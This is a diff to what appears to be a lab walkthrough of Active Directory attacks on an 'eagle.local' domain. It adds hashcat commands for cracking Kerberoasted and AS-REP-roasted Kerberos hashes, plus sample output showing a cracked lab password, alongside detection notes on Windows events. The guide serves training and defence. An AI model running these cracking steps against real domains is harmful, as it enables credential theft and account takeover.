@@ -425,6 +425,15 @@ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
 
 > 📌 **Hashcat Mode**: 13100 = Kerberos 5 TGS-REP
 
+> 💡 **Tip**: If hashcat gives an error, add `--force` at the end
+
+**View cracked password:**
+
+```bash
+cat cracked.txt
+# Output: $krb5tgs$23$*Administrator$eagle.local$...:Slavi123
+```
+
 <img width="874" height="225" alt="image" src="https://github.com/user-attachments/assets/769b49f6-bc89-47ce-880e-7b24623a6ebb" />
 
 **Cracked result:**
@@ -562,10 +571,17 @@ $krb5asrep$23$anni@eagle.local:hash...
 **Step 3: Crack with hashcat**
 
 ```bash
-hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile=cracked.txt
+hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile=cracked.txt --force
 ```
 
 > 📌 **Hashcat Mode**: 18200 = Kerberos 5 AS-REP
+
+**View cracked password:**
+
+```bash
+cat cracked.txt
+# Output: $krb5asrep$23$anni@eagle.local:...:Slavi123
+```
 
 <img width="1443" height="1449" alt="image" src="https://github.com/user-attachments/assets/5c1c9cf4-3f4a-46fd-82b8-0e45af081d74" />
 
@@ -725,7 +741,7 @@ Create decoy service account with old password. Alert on any login attempts.
 
 **Event 4771 - Failed pre-authentication:**
 
-<img width="1660" height="1125" alt="image" src="https://github.com/user-attachments/assets/6f019f62-6ccf-46c1-ae59-a0867b6e2bff" />
+<img width="1660" height="1125" alt="image" src="https://github.com/user-attachments/assets/6f019f62-6ccf-4821-ae59-a0867b6e2bff" />
 
 **Event 4776 - Failed credential validation:**
 
